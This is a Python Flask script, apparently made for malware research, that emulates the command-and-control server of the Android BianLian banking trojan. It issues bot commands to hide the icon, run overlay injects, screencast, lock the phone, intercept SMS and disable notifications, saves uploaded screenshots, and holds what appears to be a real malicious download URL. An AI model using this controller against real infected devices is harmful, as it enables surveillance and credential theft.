'''
This is a fake test C&C for Android/BianLian malware
sample sha256: d105764cd5383acacd463517691a0a7578847a8174664fc2c1da5efd8a30719d
This fake server is for testing/research only , to be run on your own host
DO NOT USE MALICIOUSLY.
MIT License
Copyright 2022, cryptax
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
'''

from flask import Flask, current_app, request, jsonify, redirect, url_for
import logging
import sys
import os
import base64
import json

logging.basicConfig(stream=sys.stdout,level=logging.DEBUG, format=f'%(asctime)s %(levelname)s %(name)s %(funcName)15s() line=%(lineno)3s: %(message)s')

# there are too many werkzeug debug logs, disabling them
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

def current_cmd():
    # to perform injections on a given app
    response =  { "success" : "true", "settings":{"hide_icon": "true", "zip_file_url":"http:\/\/peytonorozco123.top\/storage\/zip\/o0fnU9hd9i2BnXKhALsU7xmmxAz4Y2XSmerCX9Zd.zip","zip_version":""}, "stockInjects" : [ "PUT-PACKAGE-NAME" ], "showScreen" : "true" }
    
    # other tests
    # to start screencast when you launch the phone app
    #response = { "success" : "true", "stockInjects" : [ "com.android.phone" ], "showScreen" : "true" }

    # to lock the phone
    #response = { "success" : "true", "stockInjects" : [ "com.android.phone" ], "locked" : "false" }

    # spy on sms
    #response = { "success" : "true", "sms" : "true", "stockInjects" : [ "com.android.phone" ]}

    # disable notifications
    #response = { "success" : "true" , "disabledPackages" : [ "com.google.android.apps.messaging" ] }
    return response


@app.route('/api/v1/device', methods=['GET', 'POST'])
def ping():
    current_app.logger.debug(f"url={request.url} data={request.data}")
    return jsonify(current_cmd())

@app.route('/api/v1/device/screen', methods=['GET','POST'])
def screencast():
    if b'data:image' in request.data[0:30]:
        current_app.logger.debug(f"---------> Received screencast image from bot !")
        data_str = request.data.decode('utf-8')
        json_obj = json.loads(data_str)
        image = base64.b64decode(json_obj['img'][22:-1])
        i = 0
        while os.path.exists(f"screencast{i}.jpg"):
            i = i + 1

        fh = open('screencast{}.jpg'.format(i), 'wb')
        fh.write(image)
        fh.close()
        current_app.logger.debug(f"[+] Wrote image to screncast{i}.jpg")
    else:
        current_app.logger.warning(f"No image. Request: {request} url={request.url} Received Data: {request.data}")
    return jsonify(current_cmd())

@app.route('/api/v1/device/check')
@app.route('/api/v1/device/lock', methods=['GET', 'POST'])
@app.route('/api/v1/device/server-log', methods=['GET','POST'])
@app.route('/api/v1/device/sms', methods=['GET','POST'])
@app.route('/api/v1/device/push-state', methods=['GET','POST'])
def answer():
    current_app.logger.debug(f"Interesting Request: {request} url={request.url} Received Data: {request.data}")
    return jsonify(current_cmd())

@app.route('/api/v1/display/app')
def authorize():
    # we should have app?authorization=....&lang=us&appId=APPNAME
    # redirects to http://URL/storage/injects/inj/APPNAME/index.html
    current_app.logger.debug(f"url={request.url} data={request.data}")
    return redirect( url_for('static', filename='index.html'), code=302)

@app.route('/payload')
def payload():
    # thepayload.apk refers to BianLian's utility apk com.fbdev.payload
    # either use that (not malicious) or another placeholder apk
    return redirect( url_for('static', filename='thepayload.apk'), code=301)

@app.route('/storage/zip/o0fnU9hd9i2BnXKhALsU7xmmxAz4Y2XSmerCX9Zd.zip')
def inject_zip():
    # this a zip with all the images the malware fakes for all apps
    current_app.logger.debug(f"Getting the ZIP: url={request.url} data={request.data}")
    return redirect( url_for('static', filename='o0fnU9hd9i2BnXKhALsU7xmmxAz4Y2XSmerCX9Zd.zip'), code=301)

@app.route('/storage/injects/inj/com.android.phone/index.html')
def inject_html():
    return "This is fake injected Data"

@app.errorhandler(404)
def page_not_found(e):
    current_app.logger.debug(f"Returning 404 for url={request.url}")
    return "404 - Fake Server did not implement this"
    

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9999, debug=True)
    # redirect port 80 to 9999 with
    # sudo socat TCP-LISTEN:80,fork TCP:127.0.0.1:9999 
